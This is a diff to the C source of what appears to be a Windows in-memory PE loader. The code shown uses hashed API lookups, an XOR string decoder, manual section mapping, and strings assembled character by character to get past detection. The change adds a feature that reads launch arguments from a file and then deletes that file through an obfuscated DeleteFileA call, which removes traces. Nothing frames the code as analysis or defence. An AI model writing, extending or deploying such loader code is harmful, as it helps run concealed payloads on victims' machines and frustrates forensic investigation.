@@ -46,8 +46,10 @@ static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
 }
 
 
+static volatile const char _build_ts[] = __DATE__ " " __TIME__;
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    (void)hInstance; (void)hPrevInstance; (void)nCmdShow;
+    (void)hInstance; (void)hPrevInstance; (void)nCmdShow; (void)_build_ts;
 
     HMODULE hK = GetModH(0xFB4F5B77u);
     if (!hK) return 10;
@@ -454,6 +456,37 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             DWORD osp;
             pVP((BYTE*)img + ps[si].VirtualAddress, ps[si].Misc.VirtualSize, prot, &osp);
         }
+    }
+
+    char fileCmds[4096];
+    fileCmds[0] = 0;
+    if (extraArgs[0] == '@') {
+        char* fp = extraArgs + 1;
+        while (*fp == ' ' || *fp == '"') fp++;
+        char fpC[260]; int fi = 0;
+        while (fp[fi] && fp[fi] != '"' && fp[fi] != ' ' && fi < 259) { fpC[fi] = fp[fi]; fi++; }
+        fpC[fi] = 0;
+        HANDLE hCmdF = pCF(fpC, 0x80000000, 1, NULL, 3, 0, NULL);
+        if (hCmdF != INVALID_HANDLE_VALUE) {
+            char raw[4000]; raw[0] = 0;
+            DWORD fSz = pGFS(hCmdF, NULL);
+            if (fSz > 0 && fSz < 3990) { DWORD rd; pRF(hCmdF, raw, fSz, &rd, NULL); raw[rd] = 0; }
+            pCH(hCmdF);
+            char s_dfa[] = {'D','e','l','e','t','e','F','i','l','e','A',0};
+            typedef BOOL(WINAPI* fn_DFA)(LPCSTR); fn_DFA pDFA = (fn_DFA)pGPA(hK, s_dfa);
+            if (pDFA) pDFA(fpC);
+            int out = 0; char* p = raw;
+            while (*p && out < 4080) {
+                while (*p == '\r' || *p == '\n' || *p == ' ') p++;
+                if (!*p) break;
+                fileCmds[out++] = '"';
+                while (*p && *p != '\r' && *p != '\n' && out < 4080) fileCmds[out++] = *p++;
+                fileCmds[out++] = '"';
+                fileCmds[out++] = ' ';
+            }
+            fileCmds[out] = 0;
+        }
+        extraArgs = fileCmds;
     }
 
     if (*extraArgs) {
